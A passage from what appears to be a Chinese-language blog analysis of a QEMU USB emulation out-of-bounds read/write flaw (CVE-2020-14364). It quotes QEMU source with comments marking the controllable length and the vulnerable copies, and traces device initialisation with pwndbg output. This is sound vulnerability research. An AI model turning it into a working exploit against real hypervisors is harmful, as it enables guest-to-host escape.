ninterfaces;</span><br><span class="line">    <span class="type">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="type">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="type">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Structure used to hold information about an active USB packet.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBPacket</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Data fields for use by the driver.  */</span></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">uint64_t</span> id;</span><br><span class="line">    USBEndpoint *ep;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> stream;</span><br><span class="line">    QEMUIOVector iov;</span><br><span class="line">    <span class="type">uint64_t</span> parameter; <span class="comment">/* control transfers */</span></span><br><span class="line">    <span class="type">bool</span> short_not_ok;</span><br><span class="line">    <span class="type">bool</span> int_req;</span><br><span class="line">    <span class="type">int</span> status; <span class="comment">/* USB_RET_* status code */</span></span><br><span class="line">    <span class="type">int</span> actual_length; <span class="comment">/* Number of bytes actually transferred */</span></span><br><span class="line">    <span class="comment">/* Internal use by the USB layer.  */</span></span><br><span class="line">    USBPacketState state;</span><br><span class="line">    USBCombinedPacket *combined;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) <span class="built_in">queue</span>;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) combined_entry;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_token_in</span><span class="params">(USBDevice *s, USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                      s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<span class="comment">// 可控</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">// 越界读</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_token_out</span><span class="params">(USBDevice *s, USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            <span class="comment">/* transfer OK */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* ignore additional output */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<span class="comment">// 这里可控</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">// 越界写</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">usb_packet_copy</span><span class="params">(USBPacket *p, <span class="type">void</span> *ptr, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;actual_length &gt;= <span class="number">0</span>);</span><br><span class="line">    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);</span><br><span class="line">    <span class="keyword">switch</span> (p-&gt;pid) &#123;<span class="comment">// 根据pid来判断是进行读还是写</span></span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: invalid pid: %x\n&quot;</span>, __func__, p-&gt;pid);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;actual_length += bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qemu设备初始化过程"><a href="#qemu设备初始化过程" class="headerlink" title="qemu设备初始化过程"></a>qemu设备初始化过程</h2><p>执行<code>qemu-system-x86_64  -device help</code>命令可以查看所有支持的<code>device</code>，这里说一下<code>device</code>的初始化过程，首先在我们启动<code>qemu-system-x86_64</code>的时候如果指定了<code>-device</code>的选项，那么该设备就会在<code>vl.c:main</code>函数中的<code>4372</code>行进行设备的创建与初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu_opts_foreach(qemu_find_opts(<span class="string">&quot;device&quot;</span>),device_init_func, <span class="literal">NULL</span>, &amp;error_fatal);</span><br></pre></td></tr></table></figure><p>上述代码的意思是找到<code>device</code>列表之后，执行<code>device_init_func</code>函数，相关数据结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">QemuOptType</span> &#123;</span></span><br><span class="line">    QEMU_OPT_STRING = <span class="number">0</span>,  <span class="comment">/* no parsing (use string as-is)                        */</span></span><br><span class="line">    QEMU_OPT_BOOL,        <span class="comment">/* on/off                                               */</span></span><br><span class="line">    QEMU_OPT_NUMBER,      <span class="comment">/* simple number                                        */</span></span><br><span class="line">    QEMU_OPT_SIZE,        <span class="comment">/* size, accepts (K)ilo, (M)ega, (G)iga, (T)era postfix */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QemuOptDesc</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">QemuOptType</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *help;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *def_value_str;</span><br><span class="line">&#125; QemuOptDesc;</span><br><span class="line"><span class="comment">//include/qemu/option_int.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOpts</span> &#123;</span><span class="comment">// 保存每一个实例的所有参数</span></span><br><span class="line">    <span class="type">char</span> *id;</span><br><span class="line">    QemuOptsList *<span class="built_in">list</span>;</span><br><span class="line">    Location loc;</span><br><span class="line">    QTAILQ_HEAD(, QemuOpt) head;</span><br><span class="line">    QTAILQ_ENTRY(QemuOpts) next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOpt</span> &#123;</span><span class="comment">// 保存每一个实例的每一个参数</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *str;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> QemuOptDesc *desc;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">bool</span> boolean;</span><br><span class="line">        <span class="type">uint64_t</span> uint;</span><br><span class="line">    &#125; value;</span><br><span class="line"></span><br><span class="line">    QemuOpts     *opts;</span><br><span class="line">    QTAILQ_ENTRY(QemuOpt) next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//include/qemu/option.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOptsList</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *implied_opt_name;</span><br><span class="line">    <span class="type">bool</span> merge_lists;  <span class="comment">/* Merge multiple uses of option into a single list? */</span></span><br><span class="line">    QTAILQ_HEAD(, QemuOpts) head;</span><br><span class="line">    QemuOptDesc desc[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>QemuOptsList</code>是用来保存某一类的选项比如<code>device</code>，<code>qemu</code>维护了一个<code>QemuOptsList</code>的数组该数组中的每个成员都代表了解析出来的一类选项。有些只有一个选择的选项则直接保存在变量中。<code>QemuOptsList</code>保存的大选项中有很多的子选项，一个<code>QemuOpts</code>保存了一个大选项中所有的子选项。每一个子选项都是一个<code>QemuOpt</code>结构体，因此<code>QemuOpts</code>里面实际上保存的是<code>QemuOpt</code>结构的链表。</p><p> <code>QemuOpt</code>结构保存的是一个个具体的子选项，以<code>key、value</code>对的方式保存，<code>key</code>是子选项的名称，<code>value</code>是命令行参数指定的子选项的值。</p><p>从数据结构中我们可以看到<code>QemuOptsList</code>保存的是<code>QemuOpts</code>的链表，但是<code>QemuOpts</code>已经保存所有的子项了，为什么还需要一个链表呢，这是因为<code>qemu</code>启动参数中可能会存在多个相同的选项比如<code>-device</code>，<code>qemu</code>可以通过<code>device</code>创建多个不同的设备，每个设备都有自己指定的子项，因此多个<code>QemuOpts</code>是用来保存同一个选项的不同实例的。</p><p>函数代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//util/qemu-option.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QTAILQ_FOREACH(var, head, field)                                \</span></span><br><span class="line"><span class="meta">        for ((var) = ((head)-&gt;tqh_first);                               \</span></span><br><span class="line"><span class="meta">                (var);                                                  \</span></span><br><span class="line"><span class="meta">                (var) = ((var)-&gt;field.tqe_next))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">qemu_opts_foreach</span><span class="params">(QemuOptsList *<span class="built_in">list</span>, qemu_opts_loopfunc func,</span></span><br><span class="line"><span class="params">                      <span class="type">void</span> *opaque, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Location loc;</span><br><span class="line">    QemuOpts *opts;</span><br><span class="line">    <span class="type">int</span> rc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    loc_push_none(&amp;loc);</span><br><span class="line">    QTAILQ_FOREACH(opts, &amp;<span class="built_in">list</span>-&gt;head, next) &#123;</span><br><span class="line">        loc_restore(&amp;opts-&gt;loc);</span><br><span class="line">        rc = func(opaque, opts, errp);</span><br><span class="line">        <span class="keyword">if</span> (rc) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assert(!errp || !*errp);</span><br><span class="line">    &#125;</span><br><span class="line">    loc_pop(&amp;loc);</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//util/qemu-config.c</span></span><br><span class="line"><span class="type">static</span> QemuOptsList *vm_config_groups[<span class="number">48</span>];</span><br><span class="line">QemuOptsList *<span class="title function_">qemu_find_opts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *group)</span></span><br><span class="line">&#123;</span><br><span class="line">    QemuOptsList *ret;</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    ret = find_list(vm_config_groups, group, &amp;local_err);</span><br><span class="line">    <span class="keyword">if</span> (local_err) &#123;</span><br><span class="line">        error_report_err(local_err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> QemuOptsList *<span class="title function_">find_list</span><span class="params">(QemuOptsList **lists, <span class="type">const</span> <span class="type">char</span> *group,</span></span><br><span class="line"><span class="params">                               Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; lists[i] != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(lists[i]-&gt;name, group) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lists[i] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;There is no option group &#x27;%s&#x27;&quot;</span>, group);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lists[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么首先是调用<code>qemu_find_opts</code>函数，从<code>vm_config_groups</code>数组中获取得到<code>device</code>的链表，返回值是一个<code>QemuOptsList</code>的结构体指针，该结构体中保存了所有的<code>device</code>实例。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210304155938619.png" alt="图片无法显示，请联系作者" title=" "><p>接下来就是进入到<code>qemu_opts_foreach</code>，函数通过一个宏定义的<code>for</code>循环对<code>device</code>链表进行遍历操作，也就是依次取出<code>QemuOptsList</code>中保存的<code>QemuOpts</code>链表，对每个链表调用<code>device_init_func</code>函数进行初始化。该链表中保存了一个<code>-device</code>中定义的所有的参数，每一个参数都保存在<code>QemuOpt</code>结构体中。也就是说对参数中每一个<code>-device</code>实例都调用了<code>device_init_func</code>函数进行初始化处理。我们看一下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vl.c</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_init_func</span><span class="params">(<span class="type">void</span> *opaque, QemuOpts *opts, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    dev = qdev_device_add(opts, errp);</span><br><span class="line">    <span class="keyword">if</span> (!dev &amp;&amp; *errp) &#123;</span><br><span class="line">        error_report_err(*errp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dev) &#123;</span><br><span class="line">        object_unref(OBJECT(dev));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面分析可以得到传入的参数是一个<code>-device</code>实例，以<code>QemuOpts</code>链表的形式保存所有的参数。调用<code>qdev_device_add</code>函数添加每一个实例。我们看一下第一个处理的实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *opts-&gt;head -&gt;tqh_first</span><br><span class="line">$<span class="number">36</span> = &#123;</span><br><span class="line">  name = <span class="number">0x5555566cbc10</span> <span class="string">&quot;driver&quot;</span>,</span><br><span class="line">  str = <span class="number">0x5555566cbbb0</span> <span class="string">&quot;e1000&quot;</span>,</span><br><span class="line">  desc = <span class="number">0x0</span>,</span><br><span class="line">  value = &#123;</span><br><span class="line">    boolean = <span class="literal">false</span>,</span><br><span class="line">    uint = <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  opts = <span class="number">0x5555566cbb40</span>,</span><br><span class="line">  next = &#123;</span><br><span class="line">    tqe_next = <span class="number">0x5555566cbc50</span>,</span><br><span class="line">    tqe_circ = &#123;</span><br><span class="line">      tql_next = <span class="number">0x5555566cbc50</span>,</span><br><span class="line">      tql_prev = <span class="number">0x5555566cbb68</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *opts-&gt;head -&gt;tqh_first-&gt;next-&gt;tqe_next</span><br><span class="line">$<span class="number">37</span> = &#123;</span><br><span class="line">  name = <span class="number">0x5555566cbc90</span> <span class="string">&quot;netdev&quot;</span>,</span><br><span class="line">  str = <span class="number">0x5555566cbc30</span> <span class="string">&quot;net0&quot;</span>,</span><br><span class="line">  desc = <span class="number">0x0</span>,</span><br><span class="line">  value = &#123;</span><br><span class="line">    boolean = <span class="literal">false</span>,</span><br><span class="line">    uint = <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  opts = <span class="number">0x5555566cbb40</span>,</span><br><span class="line">  next = &#123;</span><br><span class="line">    tqe_next = <span class="number">0x0</span>,</span><br><span class="line">    tqe_circ = &#123;</span><br><span class="line">      tql_next = <span class="number">0x0</span>,</span><br><span class="line">      tql_prev = <span class="number">0x5555566cbbf8</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正好对应我们的启动参数<code>-device e1000,netdev=net0</code>，看一下<code>qdev_device_add</code>函数的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//qdev-monitor.c</span></span><br><span class="line">DeviceState *<span class="title function_">qdev_device_add</span><span class="params">(QemuOpts *opts, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *driver, *path;</span><br><span class="line">    DeviceState *dev = <span class="literal">NULL</span>;</span><br><span class="line">    BusState *bus = <span class="literal">NULL</span>;</span><br><span class="line">    Error *err = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">bool</span> hide;</span><br><span class="line">  <span class="comment">// 找到-device中指定驱动的名字，opts中成员driver的值就是设备对应驱动的名字</span></span><br><span class="line">  <span class="comment">// 那么接下来的qemu_opt_get函数就是依次处理driver中可能的参数</span></span><br><span class="line">    driver = qemu_opt_get(opts, <span class="string">&quot;driver&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!driver) &#123;</span><br><span class="line">        error_setg(errp, QERR_MISSING_PARAMETER, <span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    